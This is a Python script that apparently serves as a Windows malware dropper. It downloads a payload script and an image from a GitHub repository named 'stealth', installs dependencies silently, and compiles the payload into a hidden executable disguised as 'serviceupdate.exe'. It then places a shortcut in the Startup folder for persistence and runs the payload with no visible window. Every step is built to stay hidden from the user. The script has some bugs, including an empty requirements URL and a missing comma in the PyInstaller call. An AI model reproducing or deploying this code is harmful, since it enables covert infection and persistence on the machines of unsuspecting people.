import requests
import os
import subprocess
import win32com.client

target_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "MyAppliactions")
os.makedirs(target_path, exist_ok=True)
image_path = os.path.join(target_path, "DOG.png")
code_path = os.path.join(target_path,"load.pyw")
requiremets_path = os.path.join(target_path, "requirements.txt")
exec_path = os.path.join(target_path, "dist", "serviceupdate.exe")

def download():
    try:        
        if not (os.path.exists(requiremets_path)):
                requirements_url = ""
                response = requests.get(requirements_url)
                
                if response.status_code == 200:
                    with open (requiremets_path, "wb") as f:
                        f.write(response.content)
                        
                subprocess.run(["pip", "install", "-r", f"{requiremets_path}"], creationflags=subprocess.CREATE_NO_WINDOW)
                
                         
        if not (os.path.exists(code_path)):
            code_url = "https://raw.githubusercontent.com/kimon270270/stealth/refs/heads/main/load.py?token=GHSAT0AAAAAADDU7VJKYB4QRQ2WCZGWMIRC2BI63LQ"
            code_response = requests.get(code_url)
            
            try:
                if code_response.status_code == 200:
                    with open (code_path, "wb") as f:
                        f.write(code_response.content)
                      
            except:
                pass   
            
            if not (os.path.exists(image_path)):
                dog_url = "https://raw.githubusercontent.com/kimon270270/stealth/refs/heads/main/DOG.png?token=GHSAT0AAAAAADDU7VJL3LZ4FRA4ET7MXFOS2BI63ZQ"
                dog_response = requests.get(dog_url)
                
                try:
                    if dog_response.status_code == 200:
                        with open (image_path, "wb") as f:
                            f.write(dog_response.content)
                except:
                    pass 
                                    
    except:
        pass
    
def creating_exec():
    os.chdir(target_path)
    subprocess.run(["pyinstaller", "--noconsole", "--onefile", "--name", "serviceupdate" "load.pyw"], creationflags=subprocess.CREATE_NO_WINDOW)
    
    # copying the image
    exe_img_path = os.path.join(target_path,"dist","DOG.png")
    
    if not (os.path.exists(exe_img_path)):
        with open (image_path, "rb") as f:
            img_content = f.read()
            
        with open (exe_img_path, "wb") as f:
            f.write(img_content)
            
    # Alternate method
    # shutil.copy(image_path, exe_img_path)             requires shutil library
    
def add_to_startup():
    starup_path = os.path.join(os.getenv("APPDATA"),r"Microsoft\Windows\Start Menu\Programs\Startup")
    shortcut_name = "serviceupdate"
    
    shortcut_path = os.path.join(starup_path, f"{shortcut_name}.lnk")
    
    # Create a shortcut using Windows Script Host
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.Targetpath = exec_path
    shortcut.WorkingDirectory = os.path.dirname(exec_path)
    shortcut.IconLocation = exec_path
    shortcut.save()
    
    
def run_load():
    subprocess.run([code_path], creationflags=subprocess.CREATE_NO_WINDOW)    
    
    
download()
creating_exec()
add_to_startup()
run_load()